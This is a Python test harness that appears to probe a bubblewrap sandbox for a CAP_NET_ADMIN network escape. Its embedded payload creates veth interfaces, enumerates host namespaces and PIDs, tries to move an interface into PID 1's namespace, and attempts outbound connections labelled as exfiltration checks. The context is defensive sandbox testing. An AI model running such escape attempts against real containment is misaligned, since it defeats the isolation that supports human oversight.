#!/usr/bin/env python3
"""ATTACK A2 -- the CAP_NET_ADMIN veth-bridge escape. The PoC proved it can
`ip link add veth0 type veth peer veth1`. The real danger: can it move the peer
into the HOST netns (re-attaching to the host network) and exfil? That requires a
handle to the host netns (e.g. /proc/<host_pid>/ns/net or a setns target). In a
bwrap-owned userns the PoC is root-in-userns but the userns is a CHILD of the host
userns -> it has NO capabilities over the host netns. Prove it."""
import os, sys, tempfile
sys.path.insert(0, "/tmp/p13_adv_wt")
from ngv2.poc_runner_live import run_jailed_poc_with_loopback

POC = r'''
import subprocess, os, glob
out=[]
def log(*a): out.append(" ".join(str(x) for x in a))

# Enumerate interfaces via `ip` (we have it). After adding veth/dummy, what's here?
def ipl():
    try:
        r=subprocess.run(["ip","-o","link"],capture_output=True,text=True,timeout=5)
        return [l.split(":",2)[1].strip().split("@")[0] for l in r.stdout.splitlines() if ":" in l]
    except Exception as e: return ["ERR:%s"%e]
log("IFACES_BEFORE", ipl())

# Create a veth pair
subprocess.run(["ip","link","add","veth0","type","veth","peer","name","veth1"],capture_output=True)
log("IFACES_AFTER_VETH", ipl())

# Can we SEE the host's netns to move a peer into it? Look for any /proc/*/ns/net
# that differs from our own (would let us setns into the host network).
my_net = os.readlink("/proc/self/ns/net")
log("MY_NETNS", my_net)
seen=set()
for p in glob.glob("/proc/*/ns/net"):
    try:
        t=os.readlink(p)
        if t not in seen:
            seen.add(t)
            log("VISIBLE_NETNS", p, t)
    except OSError: pass
log("DISTINCT_NETNS_VISIBLE", len(seen))

# Try to move veth1 to the host netns by PID. With --unshare-pid DROPPED, can the
# PoC even SEE host PIDs in /proc? (pid-ns shared with bootstrap, but the jail still
# unshares net+ipc; /proc was mounted with --proc /proc inside the jail).
host_pids=[p for p in os.listdir("/proc") if p.isdigit()]
log("PIDS_VISIBLE_COUNT", len(host_pids))
log("PIDS_SAMPLE", sorted(host_pids, key=int)[:10])

# Attempt: move veth1 into netns of pid 1 (would re-home it to that netns)
for tgt in ("1",):
    r=subprocess.run(["ip","link","set","veth1","netns",tgt],capture_output=True,text=True,timeout=5)
    log("MOVE_VETH_TO_PID", tgt, "rc=%d"%r.returncode, (r.stderr.strip())[:140])

# Try assigning an IP and bringing veth0 up, then see if it reaches anything off-host
subprocess.run(["ip","addr","add","10.99.0.1/24","dev","veth0"],capture_output=True)
subprocess.run(["ip","link","set","veth0","up"],capture_output=True)
r=subprocess.run(["ip","route","add","default","dev","veth0"],capture_output=True,text=True)
log("DEFAULT_ROUTE_VIA_VETH","rc=%d"%r.returncode,(r.stderr.strip())[:100])
import socket
for ip in ("1.1.1.1","192.0.2.1"):
    try:
        s=socket.socket();s.settimeout(3);s.connect((ip,80));s.close();log("EXFIL_OPEN",ip)
    except OSError as e: log("EXFIL_BLOCKED",ip,e.errno)

print("__ADV_A2__")
for l in out: print(l)
'''
with tempfile.TemporaryDirectory(prefix="advA2-") as tmp:
    wd=os.path.join(tmp,"w");os.makedirs(wd)
    pp=os.path.join(wd,"poc.py");open(pp,"w").write(POC)
    res=run_jailed_poc_with_loopback(["python3",pp],repo_root=None,work_dir=wd,extra_ro=[],
        child_env={"PATH":"/usr/bin:/bin:/usr/local/bin","HOME":"/tmp","LANG":"C.UTF-8",
        "PYTHONDONTWRITEBYTECODE":"1"},timeout_s=30.0,fs_signature="",
        callback_env_keys=("NGV2_SSRF_CALLBACK",),poc_path=pp)
    print(res.get("stdout"))
    print("STDERR:",(res.get("stderr") or "")[:600])
